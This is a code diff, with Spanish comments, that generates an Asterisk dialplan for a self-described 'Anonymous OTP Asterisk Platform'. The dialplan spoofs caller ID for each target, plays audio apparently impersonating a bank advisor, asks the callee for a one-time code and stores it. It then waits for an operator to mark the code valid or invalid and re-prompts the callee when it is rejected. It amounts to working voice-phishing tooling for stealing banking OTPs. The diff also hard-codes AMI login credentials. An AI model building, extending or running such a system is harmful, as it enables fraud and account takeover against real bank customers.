@@ -529,10 +529,250 @@ async function queryAsteriskPjsipEndpoints(): Promise<{ raw: string; parsed: any
   return { raw: output, parsed: endpoints };
 }
 
+// Generate clean Asterisk extensions.conf (Dialplan) with complete routing and IVR capture
+function generateCleanDialplanConf(
+  activeCarrier = 'televox',
+  carrierHost = 'televox.carrier.net',
+  audios: { audioIntro?: string; audioPrompt?: string; audioWait?: string; audioSuccess?: string; audioAgent?: string } = {}
+): string {
+  let dialplanContent = `; ========================================================\n`;
+  dialplanContent += `; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP\n`;
+  dialplanContent += `; Auto-generado por Anonymous OTP Asterisk Platform\n`;
+  dialplanContent += `; ========================================================\n\n`;
+  dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;
+
+  const chosenIntro = audios.audioIntro || 'custom/banrearreglado';
+  const chosenPrompt = audios.audioPrompt || 'custom/solicitar_codigo_otp';
+  const chosenWait = audios.audioWait || 'custom/un_momento_validando_informacion';
+  const chosenSuccess = audios.audioSuccess || 'custom/operacion_bloqueada_exito';
+  const chosenAgent = audios.audioAgent || 'custom/conectar_asesor_banco';
+
+  dialplanContent += `[globals]\n`;
+  dialplanContent += `GLOBAL_CARRIER_HOST=${carrierHost}\n`;
+  dialplanContent += `GLOBAL_DEFAULT_INTRO=${chosenIntro}\n`;
+  dialplanContent += `GLOBAL_DEFAULT_PROMPT=${chosenPrompt}\n`;
+  dialplanContent += `GLOBAL_DEFAULT_WAIT=${chosenWait}\n`;
+  dialplanContent += `GLOBAL_DEFAULT_SUCCESS=${chosenSuccess}\n`;
+  dialplanContent += `GLOBAL_DEFAULT_AGENT=${chosenAgent}\n\n`;
+
+  dialplanContent += `; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real\n`;
+  dialplanContent += `[sub-pjsip-headers]\n`;
+  dialplanContent += `exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)\n`;
+  dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
+  dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)\n`;
+  dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>\\;party=calling\\;screen=yes\\;privacy=off)\n`;
+  dialplanContent += ` same => n,Return()\n\n`;
+
+  dialplanContent += `[from-internal]\n`;
+  dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999)\n`;
+  dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += `; 2a. Extension Dedicada de Captura de Produccion (Extension 7777)\n`;
+  dialplanContent += `exten => 7777,1,NoOp(=== TRANSFERENCIA A CAPTURA EN VIVO EXT 7777 ===)\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+  dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})\n`;
+  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+
+  dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
+  dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
+  dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
+  dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=1001)\n`;
+  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+
+  dialplanContent += `; 2c. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
+  dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
+  dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n`;
+  dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
+  dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
+  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+
+  dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
+  dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
+  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,b(sub-pjsip-headers^s^1))\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += `; 4. Regla Saliente USA / Canada 10 digitos (ej. 6104803845 -> prepends 1)\n`;
+  dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
+  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,b(sub-pjsip-headers^s^1))\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += `; 5. Regla Saliente Universal (Cualquier longitud)\n`;
+  dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
+  dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,b(sub-pjsip-headers^s^1))\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += `[from-trunk]\n`;
+  dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
+
+  dialplanContent += `[ivr-otp]\n`;
+  dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
+  dialplanContent += ` same => n,Answer()\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})\n`;
+  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
+  dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/global_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/banrearreglado))\n`;
+
+  dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/default_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/global_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))\n`;
+
+  dialplanContent += ` same => n,Set(IVR_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/8888_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${GLOBAL_DEFAULT_WAIT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))\n`;
+
+  dialplanContent += ` same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/8888_success)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))\n`;
+
+  dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;
+
+  dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))\n`;
+  dialplanContent += ` same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT})\n`;
+
+  dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo Audio de Bienvenida interactivo: \${IVR_INTRO} ===)\n`;
+  dialplanContent += ` same => n,Background(\${IVR_INTRO})\n`;
+  dialplanContent += ` same => n,WaitExten(2)\n`;
+  dialplanContent += ` same => n,Goto(ask_input)\n\n`;
+
+  dialplanContent += ` same => n(ask_input),NoOp(=== [IVR] Solicitando Codigo OTP con audio: \${IVR_PROMPT} ===)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,\${IVR_PROMPT},6,,2,10)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?check_input)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,6)\n`;
+
+  dialplanContent += ` same => n(check_input),NoOp(=== [IVR] DIGITOS RECIBIDOS DEL TECLADO: \${USER_DIGITS} ===)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" >= "4"]?otp_confirm:no_input)\n\n`;
+
+  dialplanContent += ` same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
+  dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+
+  dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: \${IVR_WAIT} ===)\n`;
+  dialplanContent += ` same => n,Playback(\${IVR_WAIT})\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+
+  dialplanContent += ` same => n,NoOp(=== [IVR] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
+  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
+  dialplanContent += ` same => n(wait_decision_loop),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
+  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR] Ciclo \${WAIT_LOOP}/20 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?otp_approved)\n`;
+  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?otp_rejected_retry)\n`;
+  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 20]?otp_approved)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Goto(wait_decision_loop)\n\n`;
+
+  dialplanContent += ` same => n(otp_approved),NoOp(=== [IVR] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR ===)\n`;
+  dialplanContent += ` same => n,Playback(\${IVR_SUCCESS})\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Set(CALLER_EXT=\${CALLERID(num)})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CALLER_EXT}" = "\${FINAL_AGENT}"]?Set(FINAL_AGENT=1002))\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR] RECONECTANDO LLAMADA CON EL ASESOR EN EXTENSION \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += ` same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+  dialplanContent += ` same => n,ExecIf($[$$[STAT(e,/var/lib/asterisk/sounds/custom/token_invalido_reintente.wav)] = 1]?Playback(custom/token_invalido_reintente):Playback(\${IVR_PROMPT}))\n`;
+  dialplanContent += ` same => n,Goto(ask_input)\n\n`;
+
+  dialplanContent += ` same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL 8888 EXITOSA: CÓDIGO \${USER_DIGITS} VALIDADO ===)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Wait(1)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += ` same => n(press1_transfer),NoOp(=== [IVR] PRESS 1 DETECTADO: TRANSFIRIENDO LLAMADA AL ASESOR ===)\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" != ""]?Playback(\${IVR_AGENT}):Playback(custom/conectar_asesor_banco))\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+  dialplanContent += ` same => n,NoOp(=== [IVR] MARCANDO EXTENSION DE AGENTE: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += ` same => n(no_input),NoOp(=== SIN ENTRADA DTMF DETECTADA ===)\n`;
+  dialplanContent += ` same => n,Playback(beep)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += `exten => 1,1,NoOp(=== [IVR] PRESS 1 DIRECTO -> ASESOR 1001 ===)\n`;
+  dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" != ""]?Playback(\${IVR_AGENT}):Playback(custom/conectar_asesor_banco))\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+  dialplanContent += ` same => n,Hangup()\n\n`;
+
+  dialplanContent += `exten => _XXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
+  dialplanContent += `exten => _XXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
+  dialplanContent += `exten => _XXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
+  dialplanContent += `exten => _XXXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
+  dialplanContent += `exten => _XXXXXXXX,1,Set(USER_DIGITS=\${EXTEN})\n`;
+  dialplanContent += ` same => n,Goto(s,otp_confirm)\n`;
+
+  return dialplanContent;
+}
+
 // Auto-repair Asterisk PJSIP configuration on server startup if malformed
 async function autoRepairAsteriskPjsipOnStartup() {
   try {
     const pjsipPath = '/etc/asterisk/pjsip.conf';
+    const dialplanPath = '/etc/asterisk/extensions.conf';
     let needsRepair = false;
 
     try {
@@ -562,6 +802,18 @@ async function autoRepairAsteriskPjsipOnStartup() {
         await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', ['pjsip reload']);
       } catch (_) {}
       console.log('[PJSIP-REPAIR] ✓ /etc/asterisk/pjsip.conf reparado y recargado con éxito para 1001 y 1002.');
+    }
+
+    // Auto-generate dialplan baseline if not present
+    if (!lastGeneratedDialplan) {
+      const cleanDialplan = generateCleanDialplanConf();
+      lastGeneratedDialplan = cleanDialplan;
+      try {
+        fs.writeFileSync(path.join(process.cwd(), 'extensions.conf'), cleanDialplan, 'utf8');
+        if (!fs.existsSync(dialplanPath)) {
+          await writeAsteriskConfigFile(dialplanPath, cleanDialplan);
+        }
+      } catch (_) {}
     }
   } catch (err: any) {
     console.warn('[PJSIP-REPAIR] Aviso en auto-reparación inicial:', err.message);
@@ -690,7 +942,9 @@ app.get('/api/asterisk/config/extensions.conf', (req, res) => {
   if (fs.existsSync('/etc/asterisk/extensions.conf')) {
     return res.send(fs.readFileSync('/etc/asterisk/extensions.conf', 'utf8'));
   }
-  res.send('; Dialplan pendiente de sincronizar');
+  const cleanDialplan = generateCleanDialplanConf();
+  lastGeneratedDialplan = cleanDialplan;
+  return res.send(cleanDialplan);
 });
 
 app.get('/api/asterisk/config/pjsip.conf', (req, res) => {
